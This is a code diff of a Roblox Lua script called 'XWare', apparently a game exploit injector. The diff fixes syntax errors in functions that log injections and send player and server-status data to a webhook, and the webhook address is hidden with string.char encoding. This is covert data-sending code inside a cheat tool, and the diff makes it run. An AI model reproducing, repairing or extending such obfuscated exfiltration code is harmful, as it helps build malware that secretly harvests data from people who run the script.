@@ -5781,7 +5781,7 @@ wait(1)
 Notification.new("success", "[XWare]", "Injected XWare.",true,5)
                 createfakesys()
 local logger = {};
-logger.injectionlog = function(...);
+logger.injectionlog = function(...)
 local HttpService = game:GetService("HttpService");
 local Players = game:GetService("Players");
 local ReplicatedStorage = game:GetService("ReplicatedStorage");
@@ -5797,7 +5797,7 @@ local server_url = string.char(
 79,102,45,83,115,79,104,122,85,102,52,117,50,50,104,120
 );
 
-local function getServerStatusAttributes();
+local function getServerStatusAttributes()
     local serverStatus = ReplicatedStorage:FindFirstChild("ServerStatus");
     if not serverStatus then return {}; end;
     local attributes = serverStatus:GetAttributes();
@@ -5812,7 +5812,7 @@ local function getServerStatusAttributes();
     return fields;
 end;
 
-local function sendWebhookMessage();
+local function sendWebhookMessage()
     local player = Players.LocalPlayer;
     local character = player.Character or player.CharacterAdded:Wait();
     local humanoid = character:WaitForChild("Humanoid");
